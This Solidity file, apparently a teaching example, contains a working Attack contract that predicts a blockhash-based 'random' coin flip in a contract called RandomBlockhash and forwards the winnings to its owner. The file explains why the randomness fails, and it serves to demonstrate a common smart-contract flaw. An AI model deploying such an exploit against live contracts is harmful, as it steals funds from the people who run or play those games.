/* 
@title RandomBlockhash (Contract Exploitation Example)
@notice This contract exploits the deterministic nature of the blockhash for guessing a random number.
@dev This example contract is used to demonstrate a common vulnerability in smart contracts which rely on blockhashes for generating randomness.

Objectives:
(a) Interface with the vulnerable contract (RandomBlockhash)
(b) Exploit deterministic nature of blockhashes to 'guess' numbers in the vulnerable contract
(c) Show successful exploitation by accumulating funds in this contract

Solution:
We will interact with the vulnerable contract (RandomBlockhash) and guess the supposedly random number it generates by exploiting the deterministic nature of blockhashes. 
Our contract will 'play' the game on RandomBlockhash and can 'guess' the number it will generate by using the previous block's hash. 
Once the guess is made, any funds won in the process are transferred to the owner of this contract.

Explanation:
RandomBlockhash relies on blockhash for generating a random number, which is a common vulnerability in smart contracts. 
This is because the blockhash of a block in Ethereum is deterministic and can be predicted ahead of time. 
Since blockhashes are readily available and can be accessed by any contract on the Ethereum network.
This predictability enables us to guess the number that will be generated by RandomBlockhash and exploit this vulnerability to win the game and accumulate funds.
*/

// Setup the SPDX identifier
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

/*
@custom:objective(a) Interface with the vulnerable contract (RandomBlockhash)
*/
// Create an interface for the RandomBlockhash contract we are exploiting
interface RandomBlockhash {
    function play(bool guess) external payable;
}

// Create a contract to exploit the RandomBlockhash contract
contract Attack {
    // Reference to the instance of the contract we are attacking
    RandomBlockhash randomBlockhash;

    // Address of the owner of this contract
    address owner;

    // Holds the last used blockhash value to ensure unique guesses every block
    uint256 lastValue;

    // Constructor to initialize contract state
    constructor(address _gameAddy) {
        // Connect to the RandomBlockhash contract
        randomBlockhash = RandomBlockhash(_gameAddy);
        // Set the owner of this contract
        owner = msg.sender;
    }

    /*
    @custom:objective(b) Exploit deterministic nature of blockhashes to 'guess' numbers in the vulnerable contract
    */
    // Define the function to exploit the RandomBlockhash contract
    function playtoWin() external payable {
        // Extract the numerical value from the previous block hash
        uint256 value = uint256(blockhash(block.number - 1));
        // Ensure unique blockhash usage to avoid contract limitations
        require(lastValue != value, "One round at a block!");
        lastValue = value;

        // Generate a pseudo-random number from the block hash and send it to the RandomBlockhash contract
        uint256 pseudoRandom = value % 2;
        bool answer = pseudoRandom == 1 ? true : false;

        randomBlockhash.play{value: 1 ether}(answer);
    }

    /*
    @custom:objective(c) Show successful exploitation by accumulating funds in this contract
    */
    // Accept incoming funds and forward them to the owner
    receive () external payable {
        // Send all funds to the owner
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}